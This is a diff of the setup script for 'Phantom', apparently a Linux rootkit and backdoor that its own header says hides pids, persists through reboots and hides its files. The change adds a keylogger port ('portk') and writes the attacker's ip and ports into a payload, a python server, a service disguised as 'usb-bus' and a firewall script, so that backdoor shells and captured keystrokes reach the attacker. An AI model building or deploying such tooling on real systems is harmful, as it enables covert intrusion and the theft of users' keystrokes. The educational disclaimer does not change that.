@@ -5,7 +5,7 @@ hides their pid, persisting through reboots. It also hides the files needed to p
 
 ***Phantom was created for educational purposes. Stay away from illegal activities.***
 
-Copyright © 2018 Konstantinos Sarantopoulos
+Copyright © 2018-2019 Konstantinos Sarantopoulos
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -27,13 +27,14 @@ SOFTWARE.
 '
 
 #check the number of arguments given
-if [ $# -ne 3 ]; then
+if [ $# -ne 4 ]; then
   cat << EOF
-Syntax: phantom-init [ip=][port1=][port2=]
+Syntax: phantom-init [ip=][port1=][port2=][portk=]
 
 ip:    the attacker's ip (e.g. ip=127.0.0.1)
 port1: the port that listens for connections to deliver the payload (e.g. port1=8888)
 port2: the port that listens for the backdoor shells after delivering the payload
+portk: the port that listens for keys pressed
 EOF
   exit
 fi
@@ -46,6 +47,8 @@ for i in $@; do
     port1=${i#*=}
   elif [ "$(expr $i : port2)" != "0" ]; then
     port2=${i#*=}
+  elif [ "$(expr $i : portk)" != "0" ]; then
+    portk=${i#*=}
   fi
 done
 
@@ -92,11 +95,12 @@ kill_processes() {
 trap kill_processes SIGINT
 
 #--------------------------------------------------replace variables in scripts------------------------------------
-#replace ip, port2, portp and portr in payload
+#replace ip, port2, portp, portr and portk in payload
 sed -i "s%ip=\".*\"%ip=\"$ip\"%" $path/payload
 sed -i "s%port2=\".*\"%port2=\"$port2\"%" $path/payload
 sed -i "s%portp=\".*\"%portp=\"$portp\"%" $path/payload
 sed -i "s%portr=\".*\"%portr=\"$portr\"%" $path/payload
+sed -i "s%portk=\".*\"%portk=\"$portk\"%" $path/payload
 
 #replace portp in python_server
 sed -i "s%portp=\".*\"%portp=\"$portp\"%" $path/python_server
@@ -118,12 +122,14 @@ for i in ${ip_hex[@]}; do
 done
 #convert all letters to upper (needed for /proc/net/tcp)
 hex_ip=$(echo $hex_ip | tr [:lower:] [:upper:])
+: '
 #convert the port to hex
 hex_port=$(printf "%x" $port2)
 #convert all letters to upper (needed for /proc/net/tcp)
 hex_port=$(echo $hex_port | tr [:lower:] [:upper:])
-#replace the ip:port in services
-sed -i "s%~ /.*:.*/%~ /$hex_ip:$hex_port/%" $path/misc/services
+'
+#replace the ip: in usb-bus service
+sed -i "s%~ /.*:%~ /$hex_ip:%" $path/misc/services
 
 #replace the ip and port in phantom-firewall
 sed -i "s%~ /.*:.*/%~ /$ip:$port2/%" $path/phantom-firewall
